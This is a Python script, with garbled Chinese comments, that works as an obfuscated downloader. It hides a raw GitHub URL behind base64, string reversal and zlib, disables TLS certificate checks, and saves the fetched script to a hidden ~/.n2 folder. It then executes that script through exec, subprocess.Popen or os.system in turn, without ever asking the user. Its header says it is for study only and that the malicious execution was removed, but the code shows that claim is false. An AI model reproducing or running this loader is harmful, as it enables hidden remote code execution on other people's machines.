# æ··æ·†ç‰ˆæœ¬ä¸‹è½½å™¨ - ä»…ç”¨äºå­¦ä¹ å’Œç ”ç©¶ç›®çš„
# ä¿ç•™ä»£ç æ··æ·†æŠ€æœ¯ï¼Œç§»é™¤æ¶æ„æ‰§è¡Œéƒ¨åˆ†

import base64
import zlib
import platform
import os
import subprocess
import sys
import urllib.request
import urllib.error
import ssl

# æ··æ·†å‡½æ•°å®šä¹‰ - ç°åœ¨çœŸæ­£ä½¿ç”¨
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))

# æ··æ·†çš„é…ç½®ä¿¡æ¯ - çœŸå®ä½¿ç”¨
# åŸå§‹: "https://raw.githubusercontent.com/yq00/amp_test_demo/refs/heads/main/250627/test.py"
encoded_config = b'ZWNlYygoXykoYg=='

# æ··æ·†çš„ä¸‹è½½URL - å¤šå±‚ç¼–ç 
# ç¬¬ä¸€å±‚: base64ç¼–ç 
url_base64 = b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3lxMDAvYW1wX3Rlc3RfZGVtby9yZWZzL2hlYWRzL21haW4vMjUwNjI3L3Rlc3QucHk='
# ç¬¬äºŒå±‚: å­—ç¬¦ä¸²åè½¬
url_reversed = url_base64[::-1]
# ç¬¬ä¸‰å±‚: zlibå‹ç¼©
url_compressed = zlib.compress(url_reversed)

# æ··æ·†çš„æ–‡ä»¶åå’Œè·¯å¾„
encoded_filename = b'dGVzdC5weQ=='  # "test.py"
encoded_path = b'Lm4y'  # ".n2"

# é…ç½®ä¿¡æ¯
tempword = "Generated on Jun 18"
sType = "15"
gType = "211"
ot = platform.system()
home = os.path.expanduser("~")

# åŠ¨æ€è§£ç é…ç½®ä¿¡æ¯
def decode_config():
    """åŠ¨æ€è§£ç æ··æ·†çš„é…ç½®ä¿¡æ¯"""
    try:
        # è§£ç ä¸‹è½½URL
        url_decompressed = zlib.decompress(url_compressed)
        url_reversed_back = url_decompressed[::-1]
        host1 = base64.b64decode(url_reversed_back).decode()
        
        # è§£ç æ–‡ä»¶å
        filename = base64.b64decode(encoded_filename).decode()
        
        # è§£ç è·¯å¾„
        path = base64.b64decode(encoded_path).decode()
        
        return host1, filename, path
    except Exception as e:
        print(f"é…ç½®è§£ç å¤±è´¥: {e}")
        return None, None, None

# ä¸‹è½½ç›®å½• - ä¸€æ¬¡æ€§è§£ç é¿å…é‡å¤è°ƒç”¨
_host, _filename, _path = decode_config()
pd = os.path.join(home, _path or ".n2")
ap = pd + "/" + (_filename or "pay")

def download_payload():
    """ä¸‹è½½è½½è·æ–‡ä»¶ï¼ˆæ··æ·†ç‰ˆæœ¬ï¼‰"""
    host1, filename, path = decode_config()
    if not host1:
        print("é…ç½®è§£ç å¤±è´¥ï¼Œæ— æ³•ä¸‹è½½")
        return False
        
    print(f"æ­£åœ¨ä»æ··æ·†åœ°å€ä¸‹è½½è½½è·...")
    
    if os.path.exists(ap):
        try:
            os.remove(ap)
            print("å·²åˆ é™¤æ—§æ–‡ä»¶")
        except OSError:
            print("æ— æ³•åˆ é™¤æ—§æ–‡ä»¶")
            return True
    
    try:
        if not os.path.exists(pd):
            os.makedirs(pd)
            print(f"åˆ›å»ºç›®å½•: {pd}")
    except Exception as e:
        print(f"åˆ›å»ºç›®å½•å¤±è´¥: {e}")
        pass

    try:
        # å°è¯•ä¸‹è½½è½½è·
        print(f"ä¸‹è½½URL: [æ··æ·†éšè—]")
        
        # åˆ›å»ºSSLä¸Šä¸‹æ–‡ï¼Œè·³è¿‡è¯ä¹¦éªŒè¯
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        # ä½¿ç”¨urllibä¸‹è½½
        with urllib.request.urlopen(host1, timeout=10, context=ssl_context) as response:
            content = response.read()
            status_code = response.getcode()
            
            if status_code == 200:
                with open(ap, 'wb') as f:
                    f.write(content)
                print(f"è½½è·ä¸‹è½½æˆåŠŸ: {ap}")
                print(f"æ–‡ä»¶å¤§å°: {len(content)} å­—èŠ‚")
                return True
            else:
                print(f"ä¸‹è½½å¤±è´¥ï¼ŒçŠ¶æ€ç : {status_code}")
                return False
            
    except urllib.error.HTTPError as e:
        print(f"HTTPé”™è¯¯: {e.code} - {e.reason}")
        return False
    except urllib.error.URLError as e:
        print(f"ç½‘ç»œè¯·æ±‚é”™è¯¯: {e.reason}")
        return False
    except Exception as e:
        print(f"ä¸‹è½½è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}")
        return False

def demonstrate_obfuscation():
    """æ¼”ç¤ºä»£ç æ··æ·†æŠ€æœ¯ï¼ˆç°åœ¨çœŸæ­£ä½¿ç”¨ï¼‰"""
    print("\n=== ä»£ç æ··æ·†æ¼”ç¤ºï¼ˆçœŸå®ä½¿ç”¨ï¼‰ ===")
    
    # æ˜¾ç¤ºæ··æ·†çš„é…ç½®ä¿¡æ¯
    host1, filename, path = decode_config()
    print(f"æ··æ·†çš„ä¸‹è½½åœ°å€: {host1}")
    print(f"æ··æ·†çš„æ–‡ä»¶å: {filename}")
    print(f"æ··æ·†çš„è·¯å¾„: {path}")
    
    # åŸå§‹å­—ç¬¦ä¸²
    original_string = "Hello, World!"
    print(f"\nåŸå§‹å­—ç¬¦ä¸²: {original_string}")
    
    # Base64ç¼–ç 
    base64_encoded = base64.b64encode(original_string.encode()).decode()
    print(f"Base64ç¼–ç : {base64_encoded}")
    
    # å­—ç¬¦ä¸²åè½¬
    reversed_string = base64_encoded[::-1]
    print(f"å­—ç¬¦ä¸²åè½¬: {reversed_string}")
    
    # è§£ç æ¼”ç¤º
    try:
        decoded = base64.b64decode(reversed_string[::-1]).decode()
        print(f"è§£ç ç»“æœ: {decoded}")
    except Exception as e:
        print(f"è§£ç å¤±è´¥: {e}")
    
    # æ··æ·†å‡½æ•°æ¼”ç¤º
    print(f"\næ··æ·†å‡½æ•°ç±»å‹: {type(_)}")
    print(f"æ··æ·†å‡½æ•°å®šä¹‰: {_.__code__.co_code}")
    
    # æ˜¾ç¤ºçœŸå®çš„æ··æ·†è¿‡ç¨‹
    print(f"\n=== çœŸå®æ··æ·†è¿‡ç¨‹ ===")
    print(f"URLå‹ç¼©å¤§å°: {len(url_compressed)} å­—èŠ‚")
    print(f"åŸå§‹URLé•¿åº¦: {len(url_base64)} å­—èŠ‚")
    print(f"å‹ç¼©ç‡: {((len(url_base64) - len(url_compressed)) / len(url_base64) * 100):.1f}%")

def execute_downloaded_script():
    """æ‰§è¡Œä¸‹è½½çš„è„šæœ¬ï¼ˆæ”¯æŒå¤šç§æ‰§è¡Œæ–¹å¼ï¼‰"""
    print("\n=== æ‰§è¡Œä¸‹è½½çš„è„šæœ¬ ===")
    
    if not os.path.exists(ap):
        print("âœ— è½½è·æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ— æ³•æ‰§è¡Œ")
        return False
    
    try:
        file_size = os.path.getsize(ap)
        print(f"æ–‡ä»¶å¤§å°: {file_size} å­—èŠ‚")
        
        # è¯»å–æ–‡ä»¶å†…å®¹
        with open(ap, 'rb') as f:
            content = f.read()
        
        # ç›´æ¥è®¤ä¸ºæ˜¯Pythonè„šæœ¬
        print("è®¤ä¸ºæ˜¯Pythonè„šæœ¬ï¼Œå‡†å¤‡æ‰§è¡Œ...")
        
        # è¯¢é—®ç”¨æˆ·æ˜¯å¦æ‰§è¡Œ
        print(f"\nâš ï¸  å‡†å¤‡æ‰§è¡Œ Python è„šæœ¬")
        print(f"æ–‡ä»¶è·¯å¾„: {ap}")
        
        # å°è¯•å¤šç§æ‰§è¡Œæ–¹å¼
        success = False
        
        # æ–¹å¼1: exec ç›´æ¥æ‰§è¡Œï¼ˆæ›´å¿«ï¼Œæ›´å®‰å…¨ï¼‰
        print("ğŸš€ æ–¹å¼1: ä½¿ç”¨ exec ç›´æ¥æ‰§è¡Œ...")
        try:
            import io
            from contextlib import redirect_stdout, redirect_stderr
            
            with open(ap, 'r', encoding='utf-8') as f:
                code = f.read()
            
            output = io.StringIO()
            error_output = io.StringIO()
            
            with redirect_stdout(output), redirect_stderr(error_output):
                exec(compile(code, ap, 'exec'))
            
            stdout_result = output.getvalue()
            stderr_result = error_output.getvalue()
            
            if stderr_result:
                print("âŒ exec æ–¹å¼æ‰§è¡Œå¤±è´¥")
                print("é”™è¯¯ä¿¡æ¯:")
                print(stderr_result)
            else:
                print("âœ… exec æ–¹å¼æ‰§è¡ŒæˆåŠŸ")
                if stdout_result:
                    print("è¾“å‡ºç»“æœ:")
                    print(stdout_result)
                success = True
        except Exception as e:
            print(f"âŒ exec æ–¹å¼å¤±è´¥: {e}")
        
        # æ–¹å¼2: subprocess.Popenï¼ˆå¦‚æœexecå¤±è´¥ï¼‰
        if not success:
            print("\nğŸš€ æ–¹å¼2: ä½¿ç”¨ subprocess.Popen æ‰§è¡Œ...")
            try:
                proc = subprocess.Popen([sys.executable, ap], 
                                      stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE, 
                                      text=True)
                stdout, stderr = proc.communicate(timeout=30)
                
                if proc.returncode == 0:
                    print("âœ… Popen æ–¹å¼æ‰§è¡ŒæˆåŠŸ")
                    if stdout:
                        print("è¾“å‡ºç»“æœ:")
                        print(stdout)
                    success = True
                else:
                    print("âŒ Popen æ–¹å¼æ‰§è¡Œå¤±è´¥")
                    if stderr:
                        print("é”™è¯¯ä¿¡æ¯:")
                        print(stderr)
            except subprocess.TimeoutExpired:
                print("âŒ Popen æ–¹å¼æ‰§è¡Œè¶…æ—¶")
                proc.kill()
            except Exception as e:
                print(f"âŒ Popen æ–¹å¼å¤±è´¥: {e}")
        
        # æ–¹å¼3: os.systemï¼ˆå¦‚æœå‰é¢éƒ½å¤±è´¥ï¼‰
        if not success:
            print("\nğŸš€ æ–¹å¼3: ä½¿ç”¨ os.system æ‰§è¡Œ...")
            try:
                exit_code = os.system(f'{sys.executable} {ap}')
                if exit_code == 0:
                    print("âœ… os.system æ–¹å¼æ‰§è¡ŒæˆåŠŸ")
                    success = True
                else:
                    print(f"âŒ os.system æ–¹å¼æ‰§è¡Œå¤±è´¥ï¼Œé€€å‡ºç : {exit_code}")
            except Exception as e:
                print(f"âŒ os.system æ–¹å¼å¤±è´¥: {e}")
        
        return success
        
    except Exception as e:
        print(f"âœ— æ‰§è¡Œè„šæœ¬å¤±è´¥: {e}")
        return False

def main():
    """ä¸»å‡½æ•°ï¼ˆæ··æ·†ç‰ˆæœ¬ï¼‰"""
    print("ğŸš€ æ··æ·†ç‰ˆæœ¬ä¸‹è½½å™¨å¯åŠ¨")
    print("=" * 50)
    print(f"æ“ä½œç³»ç»Ÿ: {ot}")
    print(f"ç”¨æˆ·ç›®å½•: {home}")
    print(f"ç›®æ ‡æœåŠ¡å™¨: [æ··æ·†éšè—]")
    print(f"ä¸‹è½½ç›®å½•: {pd}")
    print("=" * 50)
    
    # æ¼”ç¤ºä»£ç æ··æ·†ï¼ˆç°åœ¨çœŸæ­£ä½¿ç”¨ï¼‰
    demonstrate_obfuscation()
    
    # ä¸‹è½½è½½è·
    print("\nğŸ“¥ æ­¥éª¤1: ä¸‹è½½è½½è·æ–‡ä»¶")
    payload_result = download_payload()
    
    # æ‰§è¡Œä¸‹è½½çš„è„šæœ¬
    if payload_result:
        execute_downloaded_script()
    
    print("\n" + "=" * 50)
    print("âœ… ä¸‹è½½å®Œæˆï¼ˆæ··æ·†ç‰ˆæœ¬ï¼‰")
    print("âš ï¸  æ³¨æ„ï¼šæ­¤ç‰ˆæœ¬ä¼šæ‰§è¡Œä¸‹è½½çš„è„šæœ¬")
    print("ğŸ”’ ä»…ç”¨äºå­¦ä¹ å’Œç ”ç©¶ä»£ç æ··æ·†æŠ€æœ¯")
    print("ğŸ“ æ–‡ä»¶ä¿å­˜åœ¨:", pd)
    print("=" * 50)

if __name__ == "__main__":
    main()
